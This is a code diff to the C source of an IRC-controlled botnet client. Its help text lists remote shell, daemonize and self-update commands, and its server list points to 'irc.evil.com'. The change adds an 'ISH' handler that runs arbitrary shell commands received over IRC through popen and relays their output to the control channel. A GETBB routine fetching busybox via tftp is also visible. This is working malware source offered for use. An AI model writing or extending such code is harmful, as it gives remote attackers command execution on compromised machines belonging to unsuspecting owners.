@@ -54,6 +54,7 @@
  *       HELP                          = Displays this                         *
  *       IRC <command>                 = Sends this command to the server      *
  *       SH <command>                  = Executes a command                    *
+ *       ISH <command>                 = "Interactive" SH, send to channel     *
  *       BASH <command>                = Run a bash command                    *
  *       SHD <command>                 = Daemonize command                     *
  *       UPDATE <http://server/bot>    = Update this bot		       *
@@ -86,9 +87,9 @@ char *servers[] = {		// List the servers in that format, always end in (void*)0
         "irc.evil.com",
         (void*)0
 };
-////////////////////////////////////////////////////////////////////////////////
-//                  STOP HERE (Unless you know what your're doing)            //
-////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////
+// I'm not gonna tell you to STOP HERE unless you don't know what you're doing... //
+///////////////////////////////////////////////////////////////////////////////////
 #include <stdarg.h>
 #include <errno.h>
 #include <stdio.h>
@@ -915,7 +916,24 @@ void _PRIVMSG(int sock, char *sender, char *str) {
 			pclose(command);
 			exit(0);
 		}
-	
+//"Interactive" SH command (Sends to channel instead of status)	
+		if (!strncmp(message,"ISH ",3)) {
+                        char buf[1024];
+                        FILE *command;
+                        if (mfork(sender) != 0) return;
+                        memset(buf,0,1024);
+                        sprintf(buf,"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;%s",message+3);
+                        command=popen(buf,"r");
+                        while(!feof(command)) {
+                                memset(buf,0,1024);
+                                fgets(buf,1024,command);
+                                //Send(sock,"NOTICE %s :%s\n",sender,buf);
+				Send(sock,"PRIVMSG %s :%s\n",CHAN,buf);
+                                sleep(1);
+                        }
+                        pclose(command);
+                        exit(0);
+	}
 // GETBB (this installs a better busybox, via tftp. This func, like the rest, has a dependency that we would like eliminate (in this case tftp). We really want to have the c program handle as much of thse custom funcs as possile Although this could be changed to use the GET function I guess.
 		if (!strncmp(message,"GETBB ",6)) {
 			char buf[1024];
